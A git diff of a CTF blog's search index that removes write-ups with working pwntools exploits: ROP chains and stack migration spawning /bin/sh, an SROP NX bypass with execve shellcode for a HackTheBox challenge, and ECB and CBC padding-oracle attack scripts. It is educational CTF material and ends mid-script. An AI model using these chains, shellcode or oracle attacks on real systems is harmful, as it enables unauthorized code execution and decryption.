@@ -1,81 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Return Oriented Program note</title>
-    <url>/2023/10/29/rop1/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I had posted a note of pwn for beginners(<a href="https://wha13.github.io/2023/10/12/pwn-note/">link here</a>), and recently I’ve learned more about ROP, so here is this post~  </p>
-<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP?"></a>What is ROP?</h3><p>ROP(Return Oriented Program) is an attack method extended from BOF(Buffer Overflow), in ROP, the key point is to cover return address and lead it to Program Fragments you want(can be repeated many times if you have many usable fragments).<br>Basically, a fragment end with <code>ret</code> is mostly used.  </p>
-<h3 id="x86-64-ROP"><a href="#x86-64-ROP" class="headerlink" title="x86_64 ROP"></a>x86_64 ROP</h3><p>In x86_64, size of an address is 8 bytes(p64 in pwntool), so registers used frequently are rax, rdi, rsi, rdx ……<br>To connect the ROP Chain, it’s important to make sure every register called in the function, and find the corresponding fregment in the program. Is easy to find fregment with tools such as <code>ROPgadget</code>  and <code>pwntool</code>.<br><strong>ROPgadget:</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary=binary_file | grep &quot;mov dword .* ret&quot; | less</span><br></pre></td></tr></table></figure>
-<p>In this command, I want to find a gadget start with mov_dword and end with ret.<br>but is much more easier to find a register fragment with pwntool.<br><strong>pwntool</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./oob1&#x27;</span>)</span><br><span class="line"><span class="comment"># find an rdi fregment</span></span><br><span class="line">rop.rdi</span><br><span class="line"><span class="comment"># result</span></span><br><span class="line"><span class="comment"># Gadget(0x400a03, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span></span><br></pre></td></tr></table></figure>
-<p>In x86_64 system, if a variable want to be executive(or other action), it needs an syscall.  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
-<p><a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a><br>syscall table has each register need for every call and the meaning for each register.<br>p.s. execve is excution call.<br>Connect fragment like <code>pop rdi; ret</code> with a value can modify the value of <code>rdi</code> and move to mext fregment(possibly a function or syscall)<br>An example for an excution syscall:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, shellcode, pop_rsi_ret, <span class="number">0</span>, syscall)</span><br></pre></td></tr></table></figure>
-<p>This ROP chain would make the value of rax become <code>0x3b</code>(execve on <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>), and rdi value become the address of shellcode(like string: <code>/bin/sh\x00</code>)<br><code>\x00</code> is a symbol to stop reading.<br>Also, vmmap in geb-peda is often used to find writable(or something else) datas.  </p>
-<h3 id="x86-ROP"><a href="#x86-ROP" class="headerlink" title="x86 ROP"></a>x86 ROP</h3><p>Same logic as <code>x86_64</code><br><a href="https://syscalls.w3challs.com/?arch=x86">syscall table</a><br>Some differents between x86 and x86_64:  </p>
-<ol>
-<li>In x86 system, each address and register are mostly 4 bytes  </li>
-<li>int80 in x86 has the same function with syscall in x86_64<br><strong>Example:</strong><br>execve in x86:  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setting environment</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">flat(pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Pwnasm-from-LoTuX-CTF"><a href="#Pwnasm-from-LoTuX-CTF" class="headerlink" title="Pwnasm from LoTuX CTF"></a>Pwnasm from LoTuX CTF</h3><p><a href="https://lotuxctf.com/challenges#Pwnasm-27">Click link</a><br>It’s a simple ROP<br><strong>Solution</strong><br>Start with pwntool:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">rop=ROP(<span class="string">&#x27;./pwnasm&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>Extracted datas:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-<p>It’s a x86_64 system(amd64), so check out the <a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a> ,register gadgets needed to trigger <code>syscall</code> are <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>.<br>Also, from the reverse result by <a href="https://ghidra-sre.org/">Ghidra</a><img src="https://hackmd.io/_uploads/ByWE-tiMa.png"><br>there are some weird datas on the stack(our shell(<code>&#39;/bin/sh&#39;</code> at<code>0x00402000</code>) and first part of flag), so it’s possible to construct an ROP Chain and excuse the shell  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop.rax</span><br><span class="line">rop.rdi</span><br><span class="line">rop.rsi</span><br><span class="line">rop.rdx</span><br><span class="line">rop.syscall</span><br></pre></td></tr></table></figure>
-<p>Extracted datas:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; rop.rax</span><br><span class="line">Gadget(0x401000, [&#x27;pop rax&#x27;, &#x27;ret&#x27;], [&#x27;rax&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdx</span><br><span class="line">Gadget(0x401006, [&#x27;pop rdx&#x27;, &#x27;ret&#x27;], [&#x27;rdx&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rdi</span><br><span class="line">Gadget(0x401002, [&#x27;pop rdi&#x27;, &#x27;ret&#x27;], [&#x27;rdi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.rsi</span><br><span class="line">Gadget(0x401004, [&#x27;pop rsi&#x27;, &#x27;ret&#x27;], [&#x27;rsi&#x27;], 0x8)</span><br><span class="line">&gt;&gt;&gt; rop.syscall</span><br><span class="line">gadget(address=4198416, details=Gadget(0x401010, [&#x27;syscall&#x27;, &#x27;ret&#x27;], [], 0x4))</span><br></pre></td></tr></table></figure>
-<p>Finally, my exploit code:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;lotuxctf.com&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x402000</span></span><br><span class="line">pop_rax_ret=<span class="number">0x401000</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401002</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401004</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x401006</span></span><br><span class="line">syscall=<span class="number">0x401010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload=flat(pop_rax_ret, <span class="number">0x3b</span>, pop_rdi_ret, shell, pop_rsi_ret, <span class="number">0</span>, pop_rdx_ret, <span class="number">0</span>, syscall)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo server"></a>echo server</h3><p><a href="https://wha13.github.io/files/echo_server/echo_server">file</a><br><a href="https://wha13.github.io/files/echo_server/echo_server.c">source code</a><br>A x86_64 file<br>ROP Chain:<br><code>pop rdi; ret</code>-&gt;<code>change rdi location to global variable</code>-&gt;<code>trigger get function</code>-&gt;<code>return to runCMD function to bypass getString() filtering function</code><br>Exploit:  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./echo_server&#x27;</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">runCMD=<span class="number">0x4006c6</span></span><br><span class="line">gets=<span class="number">0x4005a0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400923</span></span><br><span class="line">shell=<span class="number">0x601080</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">r.recvlines(<span class="number">7</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">payload1=padding+flat(pop_rdi_ret, shell, gets, runCMD)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="rop1-sean-Pwn-2"><a href="#rop1-sean-Pwn-2" class="headerlink" title="rop1-sean_Pwn-2"></a>rop1-sean_Pwn-2</h3><p><a href="https://wha13.github.io/files/rop1-sean_Pwn-2/rop1">file</a><br><a href="https://blog.frozenkp.me/pwn/stack_migration/">Stack Migration</a>  </p>
-<h4 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h4><p>Stack Migration is a technique to cover register base into a modified stack location, and the first 8 bytes(if it’s a x86_64 system)&#x2F;first 4 bytes(if it’s a x86 system) need to be a location for new register(<del>garbage</del>)</p>
-<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>First write the ROP Chain into global variable, and trgger it in <code>func1</code>, remember to leave.</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">shell=(<span class="number">0x006c9eb8</span>+<span class="number">0x006cd548</span>)//<span class="number">2</span></span><br><span class="line">pop_rax_rdx_rbx_ret=<span class="number">0x478616</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401516</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x401637</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">read=<span class="number">0x43f4b0</span></span><br><span class="line">syscall=<span class="number">0x4003da</span></span><br><span class="line">func1=<span class="number">0x4009ae</span></span><br><span class="line">leave=<span class="number">0x4009e4</span></span><br><span class="line">main=<span class="number">0x4009e6</span></span><br><span class="line">bof2=<span class="number">0x6ccd60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=flat(<span class="number">1004120</span>, pop_rax_rdx_rbx_ret, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rdi_ret, bof2+<span class="number">10</span>*<span class="number">0x8</span>, pop_rsi_ret, <span class="number">0</span>, syscall, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;rahwhale&#x27;</span>*<span class="number">4</span>+flat(bof2, leave)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="ropfu-from-picoCTF"><a href="#ropfu-from-picoCTF" class="headerlink" title="ropfu from picoCTF"></a>ropfu from picoCTF</h3><p><a href="https://play.picoctf.org/practice/challenge/292?category=6&page=3">link</a><br>An <code>i386</code> (x86) system, key points are on above.<br>Use fragments like <code>mov dword [edx] eax; ret</code> to write shell on eax into location edx.<br>p.s.the shell input need to be converted into hex and reversed<br><strong>exploit</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./ropfu&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">52033</span>)</span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">data=(<span class="number">0x080e36a0</span>+<span class="number">0x080e6ff0</span>)//<span class="number">2</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80b073a</span></span><br><span class="line">pop_ebx_ret=<span class="number">0x8049022</span></span><br><span class="line">pop_ecx_ret=<span class="number">0x8049e29</span></span><br><span class="line">pop_edx_ebx_ret=<span class="number">0x80583b9</span></span><br><span class="line">syscall=<span class="number">0x806417d</span></span><br><span class="line">mov_edx_eax=<span class="number">0x080590f2</span></span><br><span class="line">get=<span class="number">0x08051b60</span></span><br><span class="line">read=<span class="number">0x0806ece0</span></span><br><span class="line">vuln=<span class="number">0x08049d85</span></span><br><span class="line"><span class="built_in">bin</span>=<span class="number">0x6e69622f</span></span><br><span class="line">sh=<span class="number">0x0068732f</span></span><br><span class="line">int80=<span class="number">0x0807163f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+flat(pop_eax_ret, <span class="built_in">bin</span>, pop_edx_ebx_ret, data, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, sh, pop_edx_ebx_ret, data+<span class="number">4</span>, <span class="number">0</span>, mov_edx_eax, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ebx_ret, <span class="number">0</span>, data, pop_ecx_ret, <span class="number">0</span>, int80))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>CTF</tag>
-        <tag>ROP</tag>
-        <tag>Stack Migration</tag>
-        <tag>x86_64</tag>
-        <tag>x86</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sick ROP on HackTheBox / SROP</title>
-    <url>/2024/04/23/sickrop-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP &#x3D; Sigreturn Oriented Programming<br>一支程式如果接到signal，它會把寄存器值存到stack上，這叫signal frame<br>而這些資料被處裡完後需要透過<code>__restore_rt</code>的函數去做<code>return</code>進行真的存取，也就是<a href="https://syscalls.w3challs.com/?arch=x86_64">syscall table</a>上面<code>0xf</code>的syscall<code>rt_sigreturn</code><br>利用場景主要就在ROP GADGET非常不足時…  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>checksec</strong><br><img src="https://hackmd.io/_uploads/BJataEH-0.png" alt="image">  </p>
-<p><strong>ROPgadget</strong><br><img src="https://hackmd.io/_uploads/ByNdpErWC.png" alt="image">  </p>
-<p><strong>radare2</strong><br><img src="https://hackmd.io/_uploads/rkCs6VBW0.png" alt="image">  </p>
-<p>可以發現很缺少ROP CHAIN, 程式本身只有開nx的防護，可以利用syscall table裡面的<code>mprotect</code>(就是<code>0xa</code>)進行資料段改權限。  </p>
-<p>幾個觀察點：<br>RAX的值會隨著輸入長度+1(因為會算上換行)而改變  </p>
-<p>找可寫入的地址：(with gdb-peda vmmap)<br><img src="https://hackmd.io/_uploads/B15JJBr-0.png" alt="image">  </p>
-<p>syscall 時需要呼叫回去vuln的函數，找一個指向它地址的指標：<br><img src="https://hackmd.io/_uploads/rJRWkSSW0.png" alt="image">  </p>
-<p>就可以湊出利用 Sigreturn 改寫權限的 signal frame：  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span> <span class="comment"># size</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br></pre></td></tr></table></figure>
-
-<p>最後改寫成功就可以繞調 NX 防護，然後進行一般的 RET 2 SHELLCODE!!!  </p>
-<p>完整腳本：  </p>
-<p>Exploit.py  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#r=process(&#x27;./sick_rop&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;83.136.255.150&#x27;</span>, <span class="number">52277</span>)</span><br><span class="line">rop=ROP(<span class="string">&#x27;./sick_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"></span><br><span class="line">vuln=<span class="number">0x0040102e</span></span><br><span class="line">vuln_pointer=<span class="number">0x4010d8</span></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">syscall=rop.syscall[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sig payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## NX bypass</span></span><br><span class="line">writable = <span class="number">0x400000</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rdi = writable</span><br><span class="line">frame.rsi = <span class="number">0x40000</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment">### r/w/x</span></span><br><span class="line">frame.rsp = vuln_pointer</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit</span></span><br><span class="line">payload1=<span class="string">b&#x27;w&#x27;</span>*<span class="number">40</span>+flat(vuln, syscall)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;w&#x27;</span>*<span class="number">14</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">payload2=shellcode+<span class="string">b&#x27;w&#x27;</span>*<span class="number">17</span>+p64(<span class="number">0x4010b8</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HyrLkSBZ0.png" alt="image">  </p>
-<p>p.s.中間有利用pwntools的gdb看過return address<br><img src="https://hackmd.io/_uploads/HJjwyHSZA.png" alt="image">  </p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>CTF</tag>
-        <tag>HackTheBox</tag>
-        <tag>SROP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023 年末回顧</title>
     <url>/2023/12/31/2023FINAL/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是從我fb轉貼的，之後有空會重新寫(  </p>
@@ -361,10 +286,10 @@
 ]]></content>
       <tags>
         <tag>CTF</tag>
-        <tag>ROP</tag>
         <tag>Web Security</tag>
         <tag>RSA</tag>
         <tag>BOF</tag>
+        <tag>ROP</tag>
         <tag>SSRF</tag>
         <tag>SSTI</tag>
         <tag>gopher</tag>
@@ -435,7 +360,7 @@
   <entry>
     <title>AIS3 PRE EXAM 2024 Write Up</title>
     <url>/2024/06/29/ais3-pre-exam-2024/</url>
-    <content><![CDATA[<h1 id="AIS3-PRE-EXAM-2024-Write-Up"><a href="#AIS3-PRE-EXAM-2024-Write-Up" class="headerlink" title="AIS3 PRE EXAM 2024 Write Up"></a>AIS3 PRE EXAM 2024 Write Up</h1><h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>rk.2 !!!<br>打得很開心&gt;w&lt;b<br><img src="https://hackmd.io/_uploads/rkhuugsSR.png" alt="image">  </p>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>rk.2 !!!<br>打得很開心&gt;w&lt;b<br><img src="https://hackmd.io/_uploads/rkhuugsSR.png" alt="image">  </p>
 <h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h4><p>直接送 :D<br><img src="https://hackmd.io/_uploads/Bk8gP0Cm0.png" alt="image">  </p>
 <h4 id="Three-Dimensional"><a href="#Three-Dimensional" class="headerlink" title="Three Dimensional"></a>Three Dimensional</h4><p>解包後會看到一個封包檔，Follow TCP Stream會看到一坨 G CODE  </p>
 <p><img src="https://hackmd.io/_uploads/Sya2KzkV0.png" alt="image">  </p>
@@ -601,28 +526,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Block Cipher Mode note</title>
-    <url>/2023/11/04/block-cipher-1/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>A quick Block Cipher Mode review for myself.<br>All the exploits down below are for <a href="https://github.com/oalieno/Crypto-Course/tree/master/Block-Cipher-Mode">Labs made by Oalieno</a>  </p>
-<p><a href="https://www.youtube.com/watch?v=VzuIjk1bmFE">Recommended Course</a>  </p>
-<h2 id="Block-Cipher-Mode"><a href="#Block-Cipher-Mode" class="headerlink" title="Block Cipher Mode"></a>Block Cipher Mode</h2><h2 id="Cut-and-Paste-Attack"><a href="#Cut-and-Paste-Attack" class="headerlink" title="Cut and Paste Attack"></a>Cut and Paste Attack</h2><p><strong>EBC MODE vulnerability</strong><br>Because in ECB mode, size of an block is always 16 bytes, so even though we can’t crack it, it’s still feasible to construct datas with specific size and rearrange the encrypted blocks which bring spoofing<br><strong>Exploit</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode())</span><br><span class="line"><span class="comment">#user:AAAAAAAAAAA 999999999999999 BBBBBBBBB;money: 10;</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">11</span>+<span class="string">&#x27;9&#x27;</span>*<span class="number">16</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">9</span></span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode)</span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(s.decode().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">2</span>])</span><br><span class="line">payload=s[:<span class="number">16</span>]+s[<span class="number">32</span>:<span class="number">48</span>]+s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">48</span>:]</span><br><span class="line">payload=payload.<span class="built_in">hex</span>()</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Prepend-Oracle"><a href="#Prepend-Oracle" class="headerlink" title="Prepend Oracle"></a>Prepend Oracle</h2><p><strong>EBC MODE vulnerability</strong><br>This method can be used when your input would be encrypted with message you want to encrpt<br>The main idea is to enumerate through characters until it’s same with encrypted blocks generated from only padding input.<br><strong>Exploit</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20005</span>)</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">data</span>):</span><br><span class="line">    data=data.<span class="built_in">hex</span>().encode()</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="comment">#    print(s)</span></span><br><span class="line">    r.sendline(data)</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    padding=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">32</span>-<span class="number">1</span>-i)</span><br><span class="line">    test=oracle(padding)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> oracle(padding+flag+c.encode())[:<span class="number">64</span>]==test[:<span class="number">64</span>]:</span><br><span class="line"><span class="comment">#            print(test)</span></span><br><span class="line"><span class="comment">#            print(oracle(padding+flag+c.encode()))</span></span><br><span class="line">            flag=flag+c.encode()</span><br><span class="line">            <span class="built_in">print</span>(flag, i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<h2 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a>Padding Oracle</h2><p><strong>CBC MODE vulnerability</strong><br>This method can be used when it’s possible to get the IV(Initialized Iector) value and the padding method is knowned. Also, it’s necessary that there exist some clues to check whether the input is unpaded successfuly or not<br>The main idea is to enumerate through characters until the message have been unpad successfuly, and remember to adjust the iv value sended cautiously!  </p>
-<p><strong>How to cauculate the correct value after unpad successfuly?</strong><br>that byte of data &#x3D; Now_Trying ^ IV Value at that position ^ padding<br><code>cur=xor(k, iv[now], (16-now))+cur</code><br>cur &#x3D; the decrypted block,<br>k &#x3D; the value be tried now,<br>16-now &#x3D; padding.<br><strong>Exploit</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3140</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">iv, mess</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27; = &#x27;</span>, (iv+mess).<span class="built_in">hex</span>().encode())</span><br><span class="line"><span class="comment">#    info(len((iv+mess).hex().encode()))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;PADDING CORRECT!!!&#x27;</span> <span class="keyword">in</span> r.recvline()</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(r.recvline()[:-<span class="number">1</span>].decode().split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"><span class="comment">#print(flag, len(flag))</span></span><br><span class="line">ans=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">cur=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)-<span class="number">16</span>, <span class="number">16</span>)):</span><br><span class="line">    iv, mess=flag[i:i+<span class="number">16</span>], flag[i+<span class="number">16</span>:i+<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        now=<span class="number">15</span>-j</span><br><span class="line"><span class="comment">#        info(now)</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="comment">#            info(len(bytes([k]))==1)</span></span><br><span class="line">            <span class="keyword">if</span> 